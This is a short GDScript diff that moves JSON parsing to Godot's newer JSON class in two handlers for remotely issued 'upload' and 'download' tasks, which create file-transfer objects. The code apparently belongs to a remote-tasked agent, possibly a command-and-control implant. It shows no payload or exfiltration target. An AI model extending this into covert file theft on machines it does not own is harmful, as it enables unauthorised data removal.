@@ -14,7 +14,9 @@ func _on_tasking_upload(task):
 
 	if task.has("command") and task.get("command") == "upload" and task.has("parameters"):
 		var task_id = task.get("id")
-		var parameters = parse_json(task.get("parameters"))
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(task.get("parameters"))
+		var parameters = test_json_conv.get_data()
 		
 		print("parameters: ", parameters)
 
@@ -31,7 +33,9 @@ func _on_tasking_download(task):
 
 	if task.has("command") and task.get("command") == "download" and task.has("parameters"):
 		var task_id = task.get("id")
-		var parameters = parse_json(task.get("parameters"))
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(task.get("parameters"))
+		var parameters = test_json_conv.get_data()
 
 		print("upload the following")
 		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, api)
